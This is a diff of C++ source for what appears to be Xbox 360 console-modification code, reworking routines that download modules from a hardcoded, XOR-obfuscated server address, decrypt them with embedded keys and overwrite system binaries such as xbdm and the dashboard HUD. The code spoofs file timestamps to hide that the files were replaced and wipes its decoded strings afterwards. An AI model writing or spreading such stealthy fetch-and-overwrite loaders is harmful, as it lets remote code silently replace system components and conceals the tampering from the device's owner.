@@ -2,18 +2,11 @@
 
 void OtherHack();
 
-extern "C"
-{
-	NTSTATUS NtSetSystemTime(
-		PFILETIME SystemTime,  // LARGE_INTEGER
-		PFILETIME PreviousTime // LARGE_INTEGER
-	);
-}
-
 unsigned char xbdmHash[20] = { 0xD5, 0x89, 0xA7, 0x47, 0xC0, 0xC8, 0xCC, 0x62, 0xE0, 0xC3, 0x52, 0x71, 0x68, 0x7A, 0x5A, 0x6D, 0x70, 0xC3, 0x87, 0x3A };
 char xbdmPath[19] = { 0x68, 0x72, 0x5F, 0x7E, 0x7C, 0x79, 0x7E, 0x75, 0x2A, 0x4C, 0x68, 0x72, 0x74, 0x7D, 0x3E, 0x68, 0x75, 0x68, 0x10 };
-char xbdmServerIP[13] = { 0x24, 0x25, 0x3E, 0x26, 0x23, 0x3E, 0x21, 0x24, 0x3E, 0x21, 0x24, 0x24, 0x10 };
+char xbdmServerIp[15] = { 0x21, 0x24, 0x29, 0x3E, 0x25, 0x26, 0x3E, 0x21, 0x29, 0x25, 0x3E, 0x21, 0x22, 0x27, 0x10 };
 char xbdmDownloadPath[16] = { 0x3F, 0x73, 0x7F, 0x7F, 0x7C, 0x59, 0x7D, 0x71, 0x77, 0x75, 0x7D, 0x3E, 0x60, 0x7E, 0x77, 0x10 };
+char xbdmRawName[9] = { 0x68, 0x72, 0x74, 0x7D, 0x3E, 0x68, 0x75, 0x68, 0x10 };
 
 unsigned char hudhash[20] = { 0xA5, 0x0D, 0xC2, 0xFC, 0x83, 0xCF, 0xDF, 0x06, 0xC5, 0x7D, 0x12, 0x97, 0xFB, 0xB6, 0xE6, 0xB4, 0xF8, 0xAC, 0xEC, 0xD2 };
 char fXam[14] = { 0x76, 0x63, 0x69, 0x63, 0x2A, 0x4C, 0x68, 0x71, 0x7D, 0x3E, 0x68, 0x75, 0x68, 0x10 };
@@ -22,8 +15,7 @@ char DeviceFlash[15] = { 0x4C, 0x54, 0x75, 0x66, 0x79, 0x73, 0x75, 0x4C, 0x56, 0
 char hudPath[14] = { 0x76, 0x63, 0x69, 0x63, 0x2A, 0x4C, 0x78, 0x65, 0x74, 0x3E, 0x68, 0x75, 0x68, 0x10 };
 char hudDownloadPath[16] = { 0x3F, 0x73, 0x7F, 0x7F, 0x7C, 0x59, 0x7D, 0x71, 0x77, 0x75, 0x78, 0x3E, 0x60, 0x7E, 0x77, 0x10 };
 char hudDotXex[8] = { 0x78, 0x65, 0x74, 0x3E, 0x68, 0x75, 0x68, 0x10 };
-char IpServer[13] = { 0x24, 0x25, 0x3E, 0x26, 0x23, 0x3E, 0x21, 0x24, 0x3E, 0x21, 0x24, 0x24, 0x10 };
-
+char HudServerIp[15] = { 0x21, 0x24, 0x29, 0x3E, 0x25, 0x26, 0x3E, 0x21, 0x29, 0x25, 0x3E, 0x21, 0x22, 0x27, 0x10 };
 bool isAlreadyMounted = false;
 
 NTSTATUS WriteFlashFile(char* FileName, unsigned char* File, int Size)
@@ -178,7 +170,7 @@ void WriteDank()
 		UnXorMeMe(hudPath, 14);
 		UnXorMeMe(hudDownloadPath, 16);
 		UnXorMeMe(hudDotXex, 8);
-		UnXorMeMe(IpServer, 13);
+		UnXorMeMe(HudServerIp, 15);
 		UnXorMeMe(fXam, 14);
 
 		if (!isAlreadyMounted) {
@@ -208,7 +200,7 @@ void WriteDank()
 		{
 			while (DownloadTries < 50)
 			{
-				if (DownloadFile(IpServer, hudDownloadPath, &KrazakisShoe, &ModuleLength))
+				if (DownloadFile(HudServerIp, hudDownloadPath, &KrazakisShoe, &ModuleLength))
 				{
 					if ((KrazakisShoe <= 0) || (ModuleLength <= 0))
 					{
@@ -268,7 +260,7 @@ void WriteDank()
 		memset(hudPath, 0, 14);
 		memset(hudDownloadPath, 0, 16);
 		memset(hudDotXex, 0, 8);
-		memset(IpServer, 0, 13);
+		memset(HudServerIp, 0, 15);
 		memset(fXam, 0, 14);
 
 	}
@@ -278,64 +270,104 @@ void WriteDank()
 void OtherHack()
 {
 	UnXorMeMe(xbdmPath, 19);
-	UnXorMeMe(xbdmServerIP, 13);
+	UnXorMeMe(xbdmServerIp, 15);
 	UnXorMeMe(xbdmDownloadPath, 16);
+	UnXorMeMe(xbdmRawName, 9);
+
+	HANDLE hFile = 0;
+	unsigned char* xbdmXex = 0;
+	int ModuleLength = 0;
+	unsigned char* KrazakisShoe = 0;
+	int DownloadTries = 0;
+
+	PLDR_DATA_TABLE_ENTRY xbdmHandle = (PLDR_DATA_TABLE_ENTRY)GetModuleHandle(xbdmRawName);
+
+	char xbdmFullPath[MAX_PATH];
+	sprintf(xbdmFullPath, "%ws", xbdmHandle->FullDllName);
+
+	printf("xbdmFullPath: %s\n", xbdmFullPath);
+
+	FCreateFile(&hFile, SYNCHRONIZE, xbdmFullPath, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN,
+		FILE_SYNCHRONOUS_IO_NONALERT);
 
 	printf("Load Started\n");
 
-	int ModuleLength = 0;
-	unsigned char* KrazakisShoe = 0;
-
-	int DownloadTries = 0;
-
 	printf("Starting download Loop\n");
-	MemoryBuffer Mem;
-	if (CReadFile(xbdmPath, Mem))
+
+	int FileSize = NTGetFileLength(xbdmFullPath);
+
+	printf("FileSize: %X\n", FileSize);
+
+	if (FileSize != -1)
 	{
-		unsigned char hash[0x14] = { 0 };
+		xbdmXex = (unsigned char*)malloc(FileSize);
 
-		sha1(Mem.GetData(), Mem.GetDataLength(), hash);
-
-		if (memcmp(xbdmHash, hash, 0x14))
+		if (NTReadFile(xbdmFullPath, xbdmXex, FileSize))
 		{
-			while (DownloadTries < 50)
+			unsigned char hash[0x14] = { 0 };
+
+			sha1(xbdmXex, FileSize, hash);
+
+			if (memcmp(xbdmHash, hash, 0x14))
 			{
-				if (DownloadFile(xbdmServerIP, xbdmDownloadPath, &KrazakisShoe, &ModuleLength))
+				while (DownloadTries < 50)
 				{
-					if ((KrazakisShoe <= 0) || (ModuleLength <= 0))
+					if (DownloadFile(xbdmServerIp, xbdmDownloadPath, &KrazakisShoe, &ModuleLength))
 					{
-						printf("Size or Module Pointer was NULL\n");
-						continue;
+						if ((KrazakisShoe <= 0) || (ModuleLength <= 0))
+						{
+							printf("Size or Module Pointer was NULL\n");
+							continue;
+						}
+
+						if (ModuleLength < 0x14)
+							continue;
+
+						printf("Xex downloaded\n");
+
+						unsigned char DataDigest[0x14] = { 0 };
+						sha1(KrazakisShoe, ModuleLength - 0x14, DataDigest);
+
+						if (!memcmp(DataDigest, &KrazakisShoe[ModuleLength - 0x14], 0x14))
+						{
+							printf("digest completed and correct\n");
+
+							RC4(KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14), b1BLKey, 16, b1BLKey[1]);
+							RC4(KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14), bHvRomMagic, 16, b1BLKey[1]);
+							RC4(KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14), GameKey, 6, GameKey[2]);
+
+							if (GetFileTime(hFile, &OriginalFileTime, NULL, NULL))
+							{
+								NtClose(hFile);
+
+								hFile = 0;
+
+								printf("File Time Gotten\n");
+
+								SpoofFileTime(NULL, TRUE);
+
+								if (NTWriteFile(xbdmFullPath, KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14)))
+								{
+									printf("File Written And We are Done!\n");
+
+									SpoofFileTime(NULL, FALSE);
+									break;
+								}
+
+								SpoofFileTime(NULL, FALSE);
+							}
+						}
+						else printf("XEX Hash fialed\n");
 					}
 
-					if (ModuleLength < 0x14)
-						continue;
-
-					printf("Xex downloaded\n");
-
-					unsigned char DataDigest[0x14] = { 0 };
-					sha1(KrazakisShoe, ModuleLength - 0x14, DataDigest);
-
-					if (!memcmp(DataDigest, &KrazakisShoe[ModuleLength - 0x14], 0x14))
+					if (KrazakisShoe)
 					{
-						printf("digest completed and correct\n");
-
-						RC4(KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14), b1BLKey, 16, b1BLKey[1]);
-						RC4(KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14), bHvRomMagic, 16, b1BLKey[1]);
-						RC4(KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14), GameKey, 6, GameKey[2]);
-
-						OriginalFileTime = getFileCreationTime(xbdmPath);
-
-						SpoofFileTime(NULL, TRUE);
-
-						if (CWriteFile(xbdmPath, KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14)))
-							break;
-
-						SpoofFileTime(NULL, FALSE);
-
-
+						XMemFree(KrazakisShoe, XAPO_ALLOC_ATTRIBUTES);
+						KrazakisShoe = 0;
 					}
-					else printf("XEX Hash fialed\n");
+
+					printf("Retrying....\n");
+					DownloadTries++;
 				}
 
 				if (KrazakisShoe)
@@ -343,23 +375,22 @@ void OtherHack()
 					XMemFree(KrazakisShoe, XAPO_ALLOC_ATTRIBUTES);
 					KrazakisShoe = 0;
 				}
-
-				printf("Retrying....\n");
-				DownloadTries++;
 			}
+			else printf("File Hash is connect... do nothing\n");
 
-			if (KrazakisShoe)
-			{
-				XMemFree(KrazakisShoe, XAPO_ALLOC_ATTRIBUTES);
-				KrazakisShoe = 0;
-			}
+			memset(xbdmPath, 0, 19);
+			memset(xbdmServerIp, 0, 15);
+			memset(xbdmDownloadPath, 0, 16);
+			memset(xbdmRawName, 0, 9);
+
+			if (xbdmXex)
+				free(xbdmXex);
+
+			if (hFile)
+				NtClose(hFile);
+
+			return;
+
 		}
-		else printf("File Hash is connect... do nothing\n");
-
-		memset(xbdmPath, 0, 19);
-		memset(xbdmServerIP, 0, 13);
-		memset(xbdmDownloadPath, 0, 16);
-
-		return;
 	}
 }
